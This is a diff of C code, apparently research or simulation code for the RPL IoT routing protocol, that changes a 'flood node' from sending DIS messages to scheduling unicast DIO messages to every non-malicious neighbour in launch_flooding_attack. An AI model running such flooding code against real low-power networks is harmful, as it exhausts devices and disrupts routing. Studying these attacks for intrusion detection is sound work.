@@ -12,9 +12,6 @@ void rpl_icmp6_flood_init(){
 
 /* Initialize flood node stats & neighbors array */
 void init_flood(){
-    uip_ipaddr_t lladdr = uip_ds6_get_link_local(-1)->ipaddr;
-    neighbors[0].ipaddr = lladdr;
-    neighbors[0].malicious = neighbors[0].used = true;
     flood = true;
     flooding = false;
     init_neighbors_array();
@@ -31,7 +28,7 @@ void init_select(){
 /* Initiliaze the information of the neighbors array */
 void init_neighbors_array(){
     uint8_t i;
-    for(i=1; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i){
+    for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i){
         neighbors[i].malicious = neighbors[i].used = false;
     }
 }
@@ -57,7 +54,7 @@ void flood_input(){
   if(!strcmp(message,"floods") || !strcmp(message,"select")) { //message correct from flood node
     /* Indicate in the neighbors array that the sender is a malicious node */
     uint8_t i;
-    for(i=1; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
+    for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
         if (neighbors[i].used) {
             if (compare_ip_address(&neighbors[i].ipaddr, &UIP_IP_BUF->srcipaddr)){
                 neighbors[i].malicious = true;
@@ -122,7 +119,7 @@ void add_all_nodes(){
         rpl_dag_get_root_ipaddr(&root_ip);
         if (compare_ip_address(&root_ip, &UIP_IP_BUF->srcipaddr)) return;
         uint8_t i;
-        for(i=1; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
+        for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
             /* IP address already stored*/
             if (neighbors[i].used && compare_ip_address(&neighbors[i].ipaddr, &UIP_IP_BUF->srcipaddr)) return;
             /* IP address not stored - store it and set it as used */
@@ -150,11 +147,12 @@ void launch_flooding_attack(){
           for(i=1; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
                 if (neighbors[i].used) {
                     if (!neighbors[i].malicious && !compare_ip_address(&root_ip, &neighbors[i].ipaddr)) {
-                        rpl_icmp6_dis_output(&neighbors[i].ipaddr);
+                        //rpl_icmp6_dio_output(&neighbors[i].ipaddr);
+                        rpl_timers_schedule_unicast_dio(rpl_neighbor_get_from_ipaddr(&neighbors[i].ipaddr));
                         //rpl_icmp6_malicious_output(&neighbors[i].ipaddr, &message, sizeof(message));
                         char buf[21];
                         uiplib_ipaddr_snprint(buf, sizeof(buf), &neighbors[i].ipaddr);
-                        printf("sending DIS %d to %s\n",i,buf);
+                        printf("sending DIO %d to %s\n",i,buf);
                         ++dis_sent_flood;
                     }
                 }
@@ -162,7 +160,7 @@ void launch_flooding_attack(){
           }
           ++j; 
      }
-     rpl_timers_schedule_periodic_dis();
+     //rpl_timers_schedule_periodic_dis();
      
 }
 
